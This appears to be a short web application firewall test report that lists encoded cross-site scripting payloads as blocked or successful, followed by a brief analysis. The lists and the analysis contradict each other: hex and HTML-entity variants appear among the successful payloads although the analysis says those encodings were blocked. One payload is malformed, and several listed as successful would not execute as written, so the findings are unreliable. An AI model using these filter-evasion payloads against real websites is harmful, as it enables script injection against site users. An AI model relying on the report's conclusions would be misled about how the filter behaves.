After running the tests, document the following:

## Blocked Payloads:

1. Payload blocked: <img src=x onerror=%61%6c%65%72%74(1)>
2. Payload blocked: <script>\x61\x6c\x65\x72\x74(1)</script>
3. Payload blocked: <img src=x onerror=\u0061\u006c\u0065\u0072\0074(1)>
4. Payload blocked: <script>&#97;&#108;&#101;&#114;&#116;(1)</script>


## Successful Payloads:

<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<script>alert%281%29</script>
<img src=x onerror=alert%281%29>
<script>\x61\x6c\x65\x72\x74\x28\x31\x29</script>
<img src=x onerror=\x61\x6c\x65\x72\x74\x28\x31\x29>
<script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</script>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>

## Analysis:

The WAF successfully blocked payloads encoded with HTML entities and hex encoding, indicating a robust character-based filter for these encodings.
The WAF failed to block payloads encoded with Unicode and URL encoding, suggesting that these specific encodings were not adequately filtered.
